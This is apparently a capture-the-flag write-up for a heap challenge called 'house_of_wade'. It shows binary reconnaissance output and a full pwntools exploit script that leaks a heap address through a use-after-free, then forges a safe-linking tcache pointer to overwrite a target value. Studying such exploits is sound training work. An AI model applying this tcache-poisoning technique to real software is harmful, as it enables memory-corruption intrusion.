
```c
└─$ ls                            
chall  libc.so.6  
```
```c
└─$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=909bc92697afc4059537d85880a67e9039743f0f, for GNU/Linux 3.2.0, not stripped
```

```c
┌──(kali㉿kali)-[~/CTFs/AproorvCTF/pwn/house_of_wade]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   59 Symbols  No     0               3               chall

```

___
`script.py`

```python

from pwn import *

libc = ELF("./libc.so.6", checksec=False)

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *new_order + 58
		br *new_order + 152

		br *cancel_order + 104
		
		br *did_i_pass
		br *did_i_pass + 55

		x/4gx &orders
		''')

def new_order():
	p.sendlineafter(b">", b"1")

def cancel_order(idx):
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"Slot:", idx)

def inspect_order(idx):
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b"Slot:", idx)

def modify_order(idx, data):
	p.sendlineafter(b">", b"4")
	p.sendlineafter(b"Slot:", idx)
	p.sendlineafter(b"filling: \"", data)

def did_i_pass():
	p.sendlineafter(b">", b"5")

p = process(exe.path)
GDB()

chimichanga_count = p64(0x4040c0)

new_order()
new_order()

cancel_order(b'0')

inspect_order(b'0')

p.recvuntil(b"\n")
leak_fd = u64(p.recv(6).ljust(8, b"\x00"))
print(f"leak_fd: {hex(leak_fd)}")

heap_base = leak_fd << 12 
print(f"heap_base: {hex(heap_base)}")

chimichanga_count = heap_base + 0x2a0
print(f"chimichanga_count: {hex(chimichanga_count)}")
order1_addr = heap_base + 0x300
print(f"order1_addr: {hex(order1_addr)}")

cancel_order(b'1')

fake_fd = (order1_addr >> 12) ^ chimichanga_count 
print(f"fake_fd: {hex(fake_fd)}")

modify_order(b'1', p64(fake_fd) + p64(0))

new_order()
new_order()

modify_order(b'3', p64(0xcafebabe))

p.interactive()
```
